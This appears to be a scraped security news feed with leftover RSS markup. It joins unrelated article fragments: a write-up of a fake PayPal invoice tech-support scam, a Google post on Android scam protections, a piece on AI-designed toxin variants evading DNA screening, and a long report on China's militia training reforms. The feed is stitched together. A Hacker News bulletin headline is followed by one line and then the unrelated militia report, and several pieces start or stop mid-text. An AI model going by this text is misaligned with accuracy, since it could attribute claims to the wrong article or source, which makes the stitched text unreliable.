Although it’s a pretty straightforward attempt to lure targets into calling the scammers, it’s worth writing up because it looks like it was sent out in bulk.Let’s look at the red flags.Firstly, the :PayPal doesn’t use Gmail addresses to send invoices, and they also don’t put your address in the blind carbon copy (BCC) field. BCC hides the list of recipients, which is often a sign the email was sent to a large group.And “Tina Pal” must be Pay’s evil twin—one who doesn’t know it’s customary to address your customers by name rather than “PayPal customer.”Because the message came from a genuine Gmail address, the authentication results (SPF, DKIM, and DMARC) all pass. That only proves the email wasn’t spoofed and was sent from a legitimate Gmail server, not that it’s actually from PayPal.The red flag here is that PayPal emails will not come from random Gmail addresses. Official communications come from addresses like .The email body itself was empty but came with a randomly named attachment—two red flags in one. PayPal would at least use some branding in the email and never expect their customers to open an attachment.Here’s what the invoice in the attachment looked like:Your account has been billed $823.00. The payment will be processed in the next 24 hours. Didn’t make this purchase? Contact PayPal Support right now.”“The payment will be processed in the next 24 hours” or else the rather large amount of $823 is gone.This isn’t how you normally dispute PayPal charges. Genuine PayPal emails direct you to log in to your account or use their online Resolution Center, not to call a number.Reverse lookup tools don’t show it as PayPal’s. Scammers often spoof phone numbers or register them under unrelated businesses. An official PayPal support number will appear on PayPal’s website and be recognized by lookup tools.An invoice comes from the company charging you, not from the payment provider. So, this one should have been branded for Geek Squad or be titled something like “payment notification.”What tech support scammers doIn this type of tech support scam, the target calls the listed number, and the “tech” on the other end asks to remotely log in to their computer to check for “viruses.” They might run a short program to open command prompts and folders, just to scare and distract the victim. Then they’ll ask to install another tool to “fix” things, which will search the computer for anything they can turn into money. Others will sell you  fake protection software and bill you for their services. Either way, the result is the same: you’ll be scammed out of a lot of money.The best way to stay safe is to stay informed about the tricks scammers use. Learn to spot the red flags that almost always give away scams and phishing emails, and remember:Do not open unsolicited attachments.Use verified, official ways to contact companies. Don’t call numbers listed in suspicious emails or attachments.Beware of someone wanting to connect to your computer remotely. One of the tech support scammer’s biggest weapons is their ability to connect remotely to their victims. If they do this, they essentially have total access to all of your files and folders.If you’ve already fallen victim to a tech support scam:Contact your credit card company or bank and let them know what’s happened. You may also want to file a complaint with the FTC or contact your local law enforcement, depending on your region.If you shared your password with a scammer, change it everywhere it’s used. Consider using a password manager and enable 2FA for important accounts. If scammers had access to your system, they may have planted a backdoor so they can revisit whenever they feel like it. Malwarebytes can remove these and other software left behind by scammers.Keep an eye out for unexpected payments or suspicious charges on your credit cards and bank accounts.Be wary of suspicious emails. If you’ve fallen for one scam, they may target you again.Pro tip: Malwarebytes Scam Guard recognized this email as a scam. Upload any suspicious text, emails, attachments and other files to ask for its opinion. It’s really very good at recognizing scams.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

As Cybersecurity Awareness Month wraps up, we’re focusing on one of today's most pervasive digital threats: mobile scams. In the last 12 months, fraudsters have used advanced AI tools to create more convincing schemes, resulting in over $400 billion in stolen funds globally.
For years, Android has been on the frontlines in the battle against scammers, using the best of Google AI to build proactive, multi-layered protections that can anticipate and block scams before they reach you. Android’s scam defenses protect users around the world from over 10 billion suspected malicious calls and messages every month. In addition, Google continuously performs safety checks to maintain the integrity of the RCS service. In the past month alone, this ongoing process blocked over 100 million suspicious numbers from using RCS, stopping potential scams before they could even be sent. 

To show how our scam protections work in the real world, we asked users and independent security experts to compare how well Android and iOS protect you from these threats. We're also releasing a new report that explains how modern text scams are orchestrated, helping you understand the tactics fraudsters use and how to spot them. 
Survey shows Android users’ confidence in scam protections
Google and YouGov surveyed 5,000 smartphone users across the U.S., India, and Brazil about their scam experiences. The findings were clear: Android users reported receiving fewer scam texts and felt more confident that their device was keeping them safe.
Android users were 58% more likely than iOS users to say they had not received any scam texts in the week prior to the survey. The advantage was even stronger on Pixel, where users were 96% more likely than iPhone owners to report zero scam texts.At the other end of the spectrum, iOS users were 65% more likely than Android users to report receiving three or more scam texts in a week. The difference became even more pronounced when comparing iPhone to Pixel, with iPhone users 136% more likely to say they had received a heavy volume of scam messages.Android users were 20% more likely than iOS users to describe their device’s scam protections as “very effective” or “extremely effective.” When comparing Pixel to iPhone, iPhone users were 150% more likely to say their device was not effective at all in stopping mobile fraud.YouGov study findings on users’ experience with scams on Android and iOSSecurity researchers and analysts highlight Android’s AI-driven safeguards against sophisticated scams
In a recent evaluation by Counterpoint Research, a global technology market research firm, Android smartphones were found to have the most AI-powered protections. The independent study compared the latest Pixel, Samsung, Motorola, and iPhone devices, and found that Android provides comprehensive AI-driven safeguards across ten key protection areas, including email protections, browsing protections, and on-device behavioral protections. By contrast, iOS offered AI-powered protections in only two categories. You can see the full comparison in the visual below.
Counterpoint Research comparison of Android and iOS AI-powered protections
Cybersecurity firm Leviathan Security Group conducted a funded evaluation of scam and fraud protection on the iPhone 17, Moto Razr+ 2025, Pixel 10 Pro, and Samsung Galaxy Z Fold 7. Their analysis found that Android smartphones, led by the Pixel 10 Pro, provide the highest level of default scam and fraud protection.The report particularly noted Android's robust call screening, scam detection, and real-time scam warning authentication capabilities as key differentiators. Taken together, these independent expert assessments conclude that Android’s AI-driven safeguards provide more comprehensive and intelligent protection against mobile scams.

Keeping your messages safe: Google Messages automatically filters known spam by analyzing sender reputation and message content, moving suspicious texts directly to your "spam & blocked" folder to keep them out of sight. For more complex threats, Scam Detection uses on-device AI to analyze messages from unknown senders for patterns of conversational scams (like pig butchering) and provide real-time warnings.  This helps secure your privacy while providing a robust shield against text scams. As an extra safeguard, Google Messages also helps block suspicious links in messages that are determined to be spam or scams.Combatting phone call scams:Phone by Google automatically blocks known spam calls so your phone never even rings, while Call Screen can answer the call on your behalf to identify fraudsters. If you answer, the protection continues with Scam Detection, which uses on-device AI to provide real-time warnings for suspicious conversational patterns. This processing is completely ephemeral, meaning no call content is ever saved or leaves your device. Android also helps stop social engineering during the call itself by blocking high-risk actionslike installing untrusted apps or disabling security settings, and warns you if your screen is being shared unknowingly.
These safeguards are built directly into the core of Android, alongside other features like real-time app scanning in Google Play Protect and enhanced Safe Browsing in Chrome using LLMs. With Android, you can trust that you have intelligent, multi-layered protection against scams working for you.
Android is always evolving to keep you one step ahead of scams
In a world of evolving digital threats, you deserve to feel confident that your phone is keeping you safe. That’s why we use the best of Google AI to build intelligent protections that are always improving and work for you around the clock, so you can connect, browse, and communicate with peace of mind.

The results of the test suggested there was a risk of dangerous protein variants slipping past existing screening software, so the situation was treated like the equivalent of a zero-day vulnerability.Details of that original test are being made available today as part of a much larger analysis that extends the approach to a large range of toxic proteins. Starting with 72 toxins, the researchers used three open source AI packages to generate a total of about 75,000 potential protein variants.And this is where things get a little complicated. Many of the AI-designed protein variants are going to end up being non-functional, either subtly or catastrophically failing to fold up into the correct configuration to create an active toxin.In any case, DNA sequences encoding all 75,000 designs were fed into the software that screens DNA orders for potential threats. One thing that was very clear is that there were huge variations in the ability of the four screening programs to flag these variant designs as threatening. Two of them seemed to do a pretty good job, one was mixed, and another let most of them through. Three of the software packages were updated in response to this performance, which significantly improved their ability to pick out variants.There was also a clear trend in all four screening packages: The closer the variant was to the original structurally, the more likely the package (both before and after the patches) was to be able to flag it as a threat. In all cases, there was also a cluster of variant designs that were unlikely to fold into a similar structure, and these generally weren’t flagged as threats.The research is all preliminary, and there are a lot of ways in which the experiment diverges from reality. But I am not optimistic about this particular arms race. I think that the ability of AI systems to create something deadly will advance faster than the ability of AI systems to detect its components.]]></content:encoded></item><item><title>ThreatsDay Bulletin: DNS Poisoning Flaw, Supply-Chain Heist, Rust Malware Trick and New RATs Rising</title><link>https://thehackernews.com/2025/10/threatsday-bulletin-dns-poisoning-flaw.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhgFjzmzkNrkKADylrwEMbXfJunGKEjaABUl6du-8jHmRjLcCttz7ppiq6xeoln6n2HiAd84y27XQD1LtPPlGSMbqVOk0S3xfdWlTa9ng7reAU4iAapmmJlorwCam4AyT4Sdw3KiNXyx_KLuuH6_uCdxLBLjyO7fvUzx2OwecJv0_hOR8svqk1aQLrY5O6R/s1600/threatsday-main.jpg" length="" type=""/><pubDate>Thu, 30 Oct 2025 10:54:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The comfort zone in cybersecurity is gone.

Progress is slow and almost certainly uneven across geographies and force types, but the Central Military Commission (CMC) National Defense Mobilization Department (NDMD) likely assesses that the quality of militia training is rising. Since approximately 2018, the CMC NDMD has overseen systematic efforts to address challenges across many aspects of militia training — facilities, equipment, participation, realism, jointness, instruction, evaluation, and organization. The focus of militia construction during this period has been to effect a “transformation” from “getting real” (实起来) to “getting strong” (强起来), wherein sub-national authorities responsible for building militia forces were likely instructed to resolve structural and organizational obstacles and increasingly focus on training effective modern forces.At the CMC NDMD’s direction, authorities have reoriented militia forces to focus on wartime requirements over emergency response functions and issued regulations to strengthen the commitment of militia personnel. They are working to normalize joint training between militias and the PLA and other military and non-military forces, and are likely increasing their focus on training militias to act as cohesive units. At least for authorities with adequate resources, they are investing in militia training bases, adopting simulation technologies, and using data to enhance performance evaluations. Authorities have very likely also restructured militia training to better develop foundational military, specialized, and mission operations skills. Many of these efforts are not new, but expectations for implementation, institutionalization, and outcomes are likely increasing.Early militia downsizing efforts are likely complete, and pockets of excellence within militia forces are likely emerging. While conventional assessments stress that China’s militias are under-resourced, poorly trained, and ineffective for military (rather than emergency response) operations, the reform efforts begun in 2018 have likely placed these forces on a trajectory that could eventually render such assessments outdated. However, continuing references in Chinese military media and local government documents to the “real”-to-”strong” transformation — which was likely intended for completion in 2020 — indicate the slow pace of militia system reform and lingering organizational problems, and many long-standing challenges to militia development (such as local budget constraints) almost certainly remain relevant for gauging this trajectory.In response to China’s increasing focus on militia work, governments, militaries, and national security-focused analysts should begin monitoring (or intensify monitoring of) militia construction as part of efforts to understand China’s total armed forces and national defense mobilization capability. Increasing focus on militia development also likely serves as an indicator for assessing China’s intentions with regard to Taiwan, as these forces would very likely be mobilized to support the war effort within China, in the Taiwan Strait, and in cyberspace. These forces are very likely also relevant to China’s preparations for other contingencies, such as conflict in the South China Sea. Key questions to watch going forward include whether authorities introduce a new stage of development under the 15th Five-Year Plan (FYP; 2026-2030), whether training time increases, and how frequently and sophisticatedly militia joint training with the PLA occurs (especially at the campaign level).Current militia training guidelines likely seek to promote realism, rigor, and training enhancements delivered by technology and certain methodological approaches, such as virtual reality (VR) for immersive drills, “no script” training to enhance independent decision-making, and cross-jurisdiction activities to raise the quality of militia instructors.Authorities are innovating methods for organizing militia training, with goals that likely include improving the development of niche skills and “special forces” like cyber militias and increasing year-round readiness levels; however, despite the focus on readiness, it is likely that not all militia forces undergo training each year.Authorities are likely making top-down changes to the militia system to improve coordination and jointness between militia forces and the PLA, integrating militia training with the joint operations training system, and establishing an integrated joint evaluation mechanism, likely leading to more regular joint training and use of PLA resources for militia training.Particularly since December 2023, successive provincial-level authorities have implemented policies to increase public enthusiasm for militia construction and improve the willingness of militia personnel to participate in training, directly addressing concerns that have historically impaired the quality of China’s militia forces.The CMC NDMD is guiding these and other activities — including reforming financial support for militias and merging militia equipment management with the whole-military weapons equipment system — to drive forward militia construction in support of China’s integrated national strategic system and capability, demanding real effort and resultsChina’s militia forces are highly decentralized. Military authorities across dozens of provincial military districts (省军区; PMD) and garrisons at the same level, hundreds of subordinate military sub-districts (军分区; MSD), and thousands of county-level and grassroots-level people’s armed forces departments (人民武装部; PAFD) are tasked with militia development, supported (particularly funded) by civilian authorities at the same level. Further, militia forces are categorized into emergency response forces (应急力量), specialized forces (专业力量), and special forces (特殊力量), and organized to fulfill hundreds of roles depending on the anticipated emergency response and wartime requirements of their local area or command. The types of militias organized — and the training required — vary across provinces, cities, counties, and communities. Many available public sources focus on developments and strategies in specific locations, challenging assessments of developments relevant throughout the entire militia system.Despite this geographic and functional fragmentation, the militia system is ultimately hierarchical. The CMC NDMD Militia Reserve Bureau (中央军事委员会国防动员部民兵预备役局), in particular, works through the PMD system (which consists of the military commands outlined above) to set relevant policies, standards, procedures, and requirements. Two critical documents in this effort include the “Militia Construction 14th Five-Year Plan” (民兵建设“十四五”规划; MC 14th FYP) (2021-2025) and the “Militia Military Training Outline” (民兵军事训练大纲; MMTO). Although interpretation and implementation at the local level will vary, these documents orient nationwide militia development toward shared goals in a way that almost certainly creates a baseline for assessing trends throughout the system.This report uses Chinese military media, local government documents, and other publicly discoverable sources to identify the likely contents of the MC 14th FYP and likely objectives of the MMTO in relation to militia training. The core of the analysis is a review of China Militia articles published between January 2023 and July 2025 that directly reference the CMC NDMD and its activities, which enabled assessment of this military authority’s priorities and activities in recent years. References within these China Militia articles to particular goals, concepts, and training approaches informed subsequent searches of Chinese sources available through the Recorded Future Intelligence Operations Platform and other open-source avenues, enabling an exploration of trends that are likely relevant to understanding the evolution of militia training throughout China. Additionally, this report draws on a leaked copy of an MMTO that was likely issued in the early 2010s to understand the topics this document covers and assess new developments.There are several limitations to this approach. While this report strives to highlight trends that are likely relevant throughout the militia system, it is not possible to definitively assert that any single goal, concept, or approach is being implemented across all of China. There is more evidence for some approaches than others, but uneven implementation of national-level expectations is a core challenge to the CMC NDMD’s efforts. It is similarly difficult to make definitive statements about aspects of militia development that are growing more or less common throughout the system; Chinese academic databases are used to support such analysis when possible. Additionally, no media source used for this research is, despite being credible, necessarily authoritative. The government documents used are authoritative but typically only speak for very specific localities. Nevertheless, the available public sources impart a picture of a militia system under pressure to reform training deficiencies since approximately 2018. Several notable trends and objectives that analysts should consider in future evaluations of China’s militia forces are also found.Finally, this report focuses on authorities’ efforts to improve militia training. It does not address other essential elements of militia development, such as political education and strategies to organize forces. Some relevant topics, such as militias’ access to necessary equipment, are only discussed briefly.The Goals and Challenges of Militia ConstructionMilitia forces are a component of China’s armed forces alongside the PLA and People’s Armed Police (PAP), whose personnel retain their full-time civilian occupations. Militias are under the dual leadership of civilian and military authorities (though Chinese military organizational reforms may be affecting this arrangement), are part of China’s national defense mobilization system (国防动员体系; NDMS), and are “assistants” (助手) to and a reserve force (后备力量) for the PLA. There are two main categories of militias, “primary” and “ordinary.” Primary militias (基干民兵) receive more training, resources, and are the focus of recruitment efforts, while ordinary militias (普通民兵) are a secondary reserve of registered male citizens. Except where stated otherwise, this report focuses on primary militias.China’s militia forces have multiple responsibilities that include contributing to socialist modernization, maintaining social order, responding to emergencies like natural disasters, and defending the homeland. Historically, in the context of warfighting, the focus of militia construction was mostly on arming forces for conducting conventional and guerilla operations alongside (and as a supplement to) the PLA under the strategies of “luring the enemy in deep” and traditional People’s War. However, at least since the PLA oriented itself toward “winning local wars under informatized conditions” (打赢信息化条件下的局部战争) in 2004 (and likely to some extent before), the “core function” (核心职能) of militia forces and their “main” (主) orientation has been wartime “assistance and support operations tasks” (支援保障作战任务) rather than “directly participating in war.” Over the last decade, authorities have particularly emphasized building “new-type” or “new-quality” militia forces that can support the PLA across all domains — land, sea, air, space, cyberspace, and the electromagnetic spectrum — in the context of modern warfare.Authorities from the PMD system and relevant PLA theater commands would very likely mobilize militia personnel for a range of responsibilities in wartime, some of which could be dangerous, occur at or near the front line of the conflict, and directly contribute to the success or failure of the PLA’s mission. Potential tasks include but are not limited to conducting or supporting local and rear area defense, cybersecurity for critical infrastructure, stability maintenance (entailing efforts to control unrest and dissent), joint air defense, support PLA logistics, search and rescue, intelligence collection and reconnaissance, enemy harassment, camouflage and deception, minelaying, blockade enforcement, offensive cyber operations, the deployment of special operations forces at sea, and port landing operations.Historically, China’s militia forces have carried out these roles. Maritime militia forces played a crucial role in China’s capture of the Paracel Islands from Vietnam in 1974. Forces on Woody Island were rapidly mobilized and transported by the PLA Navy to Duncan Island and Palm Island, where they rebuffed Vietnamese navy commandos. Fishing trawlers also provided authorities in China early warning that Vietnam’s navy was moving into the Paracels. During China’s invasion of Vietnam in 1979, support provided by militia forces from Yunnan and Guangxi reportedly included recapturing a riverine island seized by Vietnam, repulsing cross-border attacks from Vietnam, providing artillery support to PLA forces, repairing a road to enable PLA armored forces to outflank the enemy, delivering ammunition and supplies to the front, moving wounded personnel to the rear, and serving as guides to PLA forces along the border.However, various challenges have long impaired militia force construction and training. This is almost certainly due, in part, to the fact that militia work prioritized the needs of economic development rather than those of national defense from 1985 to approximately 2016 or 2018 (see the Efforts Under the Militia Construction 14th Five-Year Plan section for evidence of the shift back to prioritizing national defense). Some problems relate to the infrastructure that supports training, including finite fiscal resources and limited equipment; outdated and insufficient training facilities; and too few qualified instructors, including for emerging domain subjects. Other problems relate to the content of training itself, such as focus on emergency response at the expense of wartime capabilities and emphasis on the skills of the individual or squad rather than the capabilities of a whole formation or system. Still more problems relate to implementation, including non-uniform standards and lenient evaluations. In particular, authorities are vigilant against lax training that delivers more pageantry than skill development. The willingness of individuals to join militias and of entities (for example, enterprises) to organize militias has been further negatively affected by concerns such as lost wages, injury liability, and lost production time. Fundamentally, authorities worry that many militia personnel lack a strong sense of military identity and commitment to the mission of China’s armed forces.These and other factors have reportedly led to serious consequences, impairing the ability of these forces to perform the wartime tasks envisioned by authorities. For example, in 2020, an MSD commander in Hebei said of an unmanned aerial vehicle (UAV) militia unit (hereafter, fendui [分队], referring to a group of militia personnel at the battalion, company, platoon, or squad level) that prior to a raft of reforms around training quality, the discrepancy between organization, training, and evaluation and actual combat was large, and that poor understanding of realistic combat drills and unsystematic and non-standard training constrained their fighting capabilities. In cyberspace, militias and other types of reserve forces have struggled to integrate with campaign-level PLA exercises, likely due to a lack of talent. Enterprises in Inner Mongolia have actively organized militia forces but have been reluctant to dispatch them. According to the leadership of one MSD in Liaoning in 2018, anxiety about accidents involving militia personnel increased as militia training requirements became more rigorous. As a result, militia forces were training less or skipping training altogether. Even when training, forces that have to pay expenses out-of-pocket have had little “enthusiasm” for what was asked of them.Efforts Under the Militia Construction 14th Five-Year PlanOne of the mechanisms that China’s national-level authorities use to shape and direct militia development throughout the country toward a shared goal is the five-year plan (FYP). On October 9, 2021, the State Council and CMC NDMD issued the Militia Construction 14th FYP. This document is not public, but it almost certainly outlines overarching objectives and priorities for building militia forces, like the better-known “14th FYP for National Economic and Social Development” (NESD 14th FYP) does for the economy. As with the NESD 14th FYP, provincial and sub-provincial authorities develop their own MC 14th FYPs according to local conditions and more specific requirements; there is confirmation or indirect evidence of provincial-level MC 14th FYPs for 21 out of 31 provincial-level jurisdictions in China. Based on direct descriptions of the document in Chinese military media, the CMC NDMD’s reported priorities, sub-national regulations issued in recent years, and other information, the MC 14th FYP likely includes the following objectives and priorities:Increasing focus on militia developmentCementing the orientation of militia forces toward wartime requirementsProgressing development toward a “strong” force after early downsizing effortsOptimizing funding and use of financial resourcesIntegrating militia equipment management with the PLA’s equipment systemStrengthening militias’ sense of belonging to the armed forces through nationwide regulationIncreasing investment in and modernization of militia military training basesAccording to a 2025 investigation into militia force development under the MC 14th FYP that the Editorial Department of China Militia organized, this national-level plan is notable because it focused directly on militias. During the 13th FYP period, militia construction was handled under the broader “China Military Reserve Force Construction ‘13th FYP’” (我军后备力量建设“十三五”规划; 2016-2020). The formation of national and sub-national plans dedicated to militia development very likely reflects growing expectation within the CMC NDMD that the PMD system (as well as relevant civilian authorities) resolve the longstanding impediments to an effective militia force. One early 2025 expanded meeting of the CMC NDMD Chinese Communist Party (CCP) Committee demanded that authorities “truly pay attention, truly exert effort, truly implement, and truly achieve results“ (做到真上心, 真用力, 真落地, 真见效) in national defense mobilization work (of which militia force construction is a part). Under the MC 14th FYP, militia construction is being considered a political task in implementing the CMC chairman responsibility system (军委主席负责制) — thereby linking militia reforms to CCP General Secretary Xi Jinping’s personal leadership of China’s armed forces through his role as CMC chairman — and a major task in consolidating an integrated national strategic system and capability (一体化国家战略体系和能力).The MC 14th FYP has likely cemented the militia’s orientation toward wartime requirements. The aforementioned China Militia investigation highlights that a CMC NDMD “militia construction situation analysis and work promotion conference” (convened on an unspecified date) changed the rhetorical formulation that encapsulates militia functions from “respond to emergencies, respond to war” (应急应战) to “respond to war, respond to emergencies” (应战应急). In this, the primary focus of militia construction has become military-oriented war preparations rather than civilian-oriented emergency response roles, even though militias still shoulder both responsibilities and sources still use the former formulation frequently. It is possible that this change occurred in 2018, in the middle of the 13th FYP; a 2018 PLA Daily article about a “situation analysis” conference used this formulation to describe militia work. It is also possible this change occurred earlier. In 2016, the wider NDMS’s emphasis began shifting back to war mobilization capabilities after years of relative focus on supporting economic development and emergency response. In prioritizing preparations and capabilities for war, militia forces have maintained their pre-existing “main” orientation toward wartime support roles rather than reverting to a “main” orientation of “directly participating in war” (see the section titled The Goals and Challenges of Militia Construction for more details on the history of this point). Grassroots authorities in Dongguan, Guangdong, hold a militia work meeting in 2022 and promote the “real”-to-”strong” transformation (Source: Sun0796)
        The national-level MC 14th FYP likely also conceptualized militia work as deepening a transformational process that began in 2018, moving past earlier force reduction goals and seeking to overcome trickier organizational problems so authorities could increasingly turn to improving the efficacy of militia forces. In 2018, two rhetorical formulations emerged to guide militia work. One describes reforming militia forces “from large to powerful, from capable to elite” (由庞大走向强大、由精干走向精锐; alternatively, 从强大走向精锐). The second describes a transformation from “getting real” to “getting good” and “getting strong” (由“实起来”向“好起来”、“强起来”转变). While the former rhetoric, which refers equally to a downsizing goal and next steps, likely captures the long-term objective, the latter refers to a phased implementation plan. In 2018, the CMC NDMD issued trial measures for militia-related work that likely stipulated forces be “real” by 2018, “good” by 2019, and “strong” by 2020. In this, becoming “real” likely meant overcoming not only impractically large force sizes and structural emphasis on outdated modes of conflict (the focus of early reforms, as discussed below), but also problems like repetitious organization (重复编兵), fake enlistment (虚假编兵), and disparities between organization, training, and real-world use (编训用脱节).Despite the likely 2020 deadline, Chinese military media, provincial and sub-provincial militia work meetings, and other sources have continued to frame militia work using this “real”-to-”strong” rhetoric throughout the MC 14th FYP period. When asked about how to conduct “high-quality” militia organizational work, unspecified persons affiliated with CMC NDMD-subordinate institutions (机关) told China Militia journalists in a 2025 interview that authorities should seek to achieve this transformation and reiterated the need to resolve the types of organizational challenges named above.Under the MC 14th FYP, authorities were reportedly tasked with “building muscle” while maintaining the current scale of the militia force (规模不变) by continuing to reform approaches to force organization, optimizing resource allocation, and strengthening combat capabilities. This contrasts with militia construction efforts during the 13th FYP and earlier stages of broader “below-the-neck” (脖子以下) military reforms. These earlier reform periods placed more focus on reducing the number of militia fendui and personnel nationwide, building up “new-type” or “new-quality” fendui within emerging domains like cyber, and crafting a sleeker but more capable and modern force. “China’s National Defense in the New Era” (a government-issued white paper) stated in 2019 that authorities were “streamlining the number of primary militia nationwide, driving deeper reform of militia and reserve forces in their size, structure and composition” to enable “integrated development” of reserve and active-duty forces and accelerating the transformation of militia forces from mainly supporting the ground force to supporting multiple military services.This “building muscle” task suggests that authorities had largely completed downsizing efforts, began turning their attention to more granular organizational issues, and were supposed to start becoming effective by focusing on training-related challenges. The “real”-to-”strong” rhetoric also suggests this shift by instructing authorities to progress beyond “getting real” to focus on becoming “good” and “strong.” Essentially, the MC 14th FYP likely signaled that the force reduction was complete but that militia work generally remained in a transitory state between addressing harder organizational problems and improving troop efficacy. The “large”-to-”elite” formulation remains relevant to understanding the overall trajectory of militia forces, but emphasis is likely now on the latter objective: moving from “capable to elite.” The structural reforms aimed at modernizing the composition of militia forces by focusing on recruitment from emerging domains may not be complete, but this question requires further research. The aforementioned CMC NDMD-affiliated interviewees reiterate this as an important area of work.The MC 14th FYP likely seeks to facilitate these militia modernization objectives in a number of ways, including by guiding authorities to modernize militia training facilities and to issue policies that encourage militia participation throughout society. Both of these subjects are discussed in more detail below. Additional efforts include reforming financial support for militia development and militias’ access to needed equipment. In recent years, the CMC NDMD has reportedly sought to optimize the direction and amount of funding provided for militia work. The CMC NDMD has also sought to build a “comprehensive support standards system” (综合保障标准体系) to ensure that financial resources are focused on combat power. The CMC NDMD has also reportedly striven to bring militia equipment support into the “whole-military weapons equipment support system” (全军武器装备保障体系) and introduced a “new model” of equipment warehouse management to MSD authorities. Since the MC 14th FYP was adopted, local authorities have reportedly used a variety of methods (for example, self-procurement and pre-requisitioning) to improve access to equipment and advanced technologies.Modernizing Militia Training BasesThe MC 14th FYP likely focuses on improving investment in and the quality of militia military training bases (民兵军事训练基地; MMTB). For example, a news report on the Shanxi PMD’s May 2025 inspection of city-level bases referenced requirements set by the national MC 14th FYP and Shanxi’s “Militia Training Base Construction Three-Year Development Plan” that called for such bases to be built or renovated and operational by the end of the year. Hunan, and at least one subordinate jurisdiction, have similarly issued 14th FYPs for MMTB development. A July 2025 news report on the opening of a district-level training base in Xiamen notes this was a “major project” of Fujian’s provincial MC 14th FYP. At the provincial and sub-provincial levels, authorities in Fujian have written militia training base construction into their NESD 14th FYPs. Within this activity, two notable trends in MMTB modernization include adopting new technology like simulation and virtual reality (VR) to strengthen training and establishing specialized bases for specific requirements. For example:Zhejiang authorities are pursuing a “one base, one specialty” (一基地一特色) model that mines local enterprises for applicable technologies, such as to establish MMTBs with ship navigation simulation, UAV coordination and confrontation simulation, virtual shooting ranges, and cyber ranges.Authorities created Dongguan, Guangdong’s first cyber militia training base in 2019 at the Chinese Academy of Sciences Cloud Computing Center (CAS CCC; 中国科学院云计算中心), to support cyber militia talent development and cyber offense-defense training.The Xinjiang Production and Construction Corps Second Division is using VR at its MMTB to simulate immersive realistic confrontation training and cultivate UAV operators, communications support, and other talent.Authorities in Guizhou have renovated a county-level MMTB to add a UAV specialized training field that comprises a multi-rotor drone training area, first-person-view (FPV) direct line training area, FPV comprehensive training area, and drone repair center.Another trend is coordinating MMTBs for use as multi-functional, comprehensive spaces that serve military and local government needs. Efforts to refine a three-tiered approach to organizing MMTBs, which were seen as early as 2011, are also continuing. Hunan and Hubei, for instance, both employ this model: provincial bases are the backbone, city bases are the main, and county bases are the supplement. This echoes the hierarchical approach to militia training more broadly (see ). These efforts are not only aimed at improving training but also optimizing available resources to prevent waste. Specific examples of these reforms include:Hebei authorities establishing provincial-level specialized emergency response training bases on the basis of four existing city-level MMTBs; the new MMTBs respectively focus on counter-terrorism and stability maintenance, forest firefighting, earthquake relief, and flood relief.Authorities in Shandong converting traditional single-function county-level MMTBs into comprehensive MMTBs that can serve militia, PAP, and public security training requirements.Hunan authorities implementing military-local government joint development of a provincial, city, and county multi-level MMTB system in which facilities are established at key locations (for example, where potential aerial threats are a prominent concern and along common PLA cross-region maneuver routes) and designed to focus on that area’s priority requirement while accommodating other needs like national defense education, student military training, civil air defense team training, and the needs of locally garrisoned troops.Providing Benefits to Spur ParticipationUnder the MC 14th FYP, the CMC NDMD has guided every PMD to formulate and issue policies that induce recruits, enterprises, and other entities to participate in militia construction and training more enthusiastically. Since 2020, at least fifteen (and possibly as many as 22) provincial-level jurisdictions across China have issued (or are formulating) highly uniform sets of policy measures that seek to strengthen militia development in this manner, with all but one such measure issued in or after December 2023. Sub-provincial authorities have issued similar measures since at least 2018. Several of these regulatory documents specifically mention the national MC 14th FYP or their local MC 14th FYPs as a basis for the measures. The measures provide militia personnel and the entities that organize militia  (for example, enterprises, universities, work units, and social organizations) with tangible benefits and greater financial security in exchange for their service in China’s armed forces.In at least fourteen of China’s 31 provincial-level jurisdictions, provincial-level civilian and military authorities have jointly issued documents called “militia rights and benefits guarantee measures” (民兵权益保障办法), “primary militia preferential treatment and rights and benefits guarantee measures” (基干民兵优待和权益保障办法), and other close variations. As seen in , the earliest of these was issued in December 2020 in Inner Mongolia, while the remainder were all issued in or after December 2023. In one of the fourteen jurisdictions (Henan), authorities have issued the measures for public comment but have not yet formally adopted them. Half of these policies are “trial” or “provisional” measures, indicating they will likely be formalized and potentially revised after an assessment of whether they achieve authorities’ goals. In September 2025, authorities in Guangdong deliberated their version of these measures, raising the number of provincial-level jurisdictions that have issued or are formulating the measures to fifteen.Sub-provincial localities within at least seven additional provincial-level jurisdictions have also issued these measures, raising the possibility that corresponding provincial-level policies also exist. These local-level measures are seen in Anhui (in 2023), Chongqing (“recent years” before 2024), Jilin (2021), Shaanxi (2022), Shandong (2024), Sichuan (2022), and Qinghai (2023 and 2024). The earliest adoption of a similar measures package likely occurred in Panjin, Liaoning, in 2018. Delegates to Chongqing’s 2024 “Two Sessions” legislative event reportedly “hotly discussed” the adoption of such measures at the municipal (provincial) level, but it is unclear whether Chongqing authorities have done so.Although variation exists, the rationale for these measures is highly uniform across all of the issued policies. The CMC NDMD’s reported goal is to “make militias truly find the feeling of being a ‘soldier’ and enjoy the treatment of a ‘soldier.’” According to Hunan province’s version of the measures, their goal is to stimulate the sense of honor, responsibility, and mission of the masses and various entities that support and participate in militia work. Many also refer to improving the “sense of gain” (获得感) felt by participants in militia work. As seen in discussions during Chongqing’s 2024 “Two Sessions” and media comments by elements of the Gansu PMD, the measures are understood as contributing to the construction of a “militia honors system” (民兵荣誉体系). The benefits are being highlighted in militia recruitment drives as incentives for joining. A 2021 China National Defense News article covering these measures in one Jilin city asserted that “preferential treatment policies are stimulating the passion of the majority of militiamen for training and work"; one member of a local militia reportedly said the forces have been given this much “warmth and caring” and therefore must repay it with “practical action.”The measures are generally divided into two sets of policies, one catering to militia personnel and one catering to entities that organize militias. The measures most frequently apply to primary militias rather than ordinary militias. However, some jurisdictions offer a relatively limited set of benefits to all militias or extend the benefits of primary militia status to ordinary militias when the latter are on duty executing wartime and emergency response roles. The measures issued in each jurisdiction do not offer the exact same mix of specific policies, but nearly all of the measures in each issued policy fall within the same fifteen benefit categories. Benefits for militia personnel include monetary and non-monetary rewards for exemplary performance, hardship assistance, medical insurance to cover injuries sustained during training or deployment, duty subsidies, and preferential or discounted access to various services like national parks, banking, and transportation. Benefits for entities that organize militias include enrollment in military-civil fusion procurement channels, priority consideration for participation in political fora, and reimbursement or tax deductions for militia-related expenses. See  for more benefits and details.Objectives of the Militia Military Training OutlineAnother mechanism shaping and directing militia development throughout China toward a shared goal is the Militia Military Training Outline, which is very likely 